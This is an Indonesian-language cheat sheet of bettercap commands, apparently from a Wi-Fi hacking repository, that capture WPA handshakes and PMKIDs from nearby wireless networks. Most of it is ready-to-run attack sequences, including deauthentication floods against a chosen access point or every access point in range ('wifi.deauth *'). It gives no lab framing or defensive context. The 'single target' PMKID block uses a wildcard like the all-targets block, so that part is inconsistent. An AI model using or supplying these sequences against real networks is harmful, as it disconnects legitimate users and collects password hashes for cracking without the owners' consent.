## 1. Mode Interaktif

```
bettercap
```

> Kalo muncul output error kaya gini `No active interfaces found.`. Pake opsi `-iface [interface]`.

### Capture Handshake

Single target:

```
set wifi.handshakes.file [output]
wifi.recon on
set ticker.commands "clear; wifi.show"
ticker on
ticker off
set wifi.assoc.skip *
wifi.deauth [bssid]
```

Semua target:

```
set wifi.handshakes.file [output]
set wifi.handshakes.aggregate false
wifi.recon on
set ticker.commands "clear; wifi.show"
ticker on
ticker off
set wifi.assoc.skip *
wifi.deauth *
```

## Capture PMKID

Single target:

```
set wifi.handshakes.file [output]
wifi.recon on
set ticker.commands "clear; wifi.show"
ticker on
ticker off
wifi.assoc *
```

Semua target:

```
set wifi.handshakes.file [output]
set wifi.handshakes.aggregate false
wifi.recon on
set ticker.commands "clear; wifi.show"
ticker on
ticker off
wifi.assoc *
```

## 2. Opsi Caplet

```
bettercap -caplet [file_caplet]
```

> Kalo muncul output error kaya gini `No active interfaces found.`. Pake opsi `-iface [interface]`.

Contoh file capletnya ada disini: [https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/caplet.cap](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/caplet.cap)
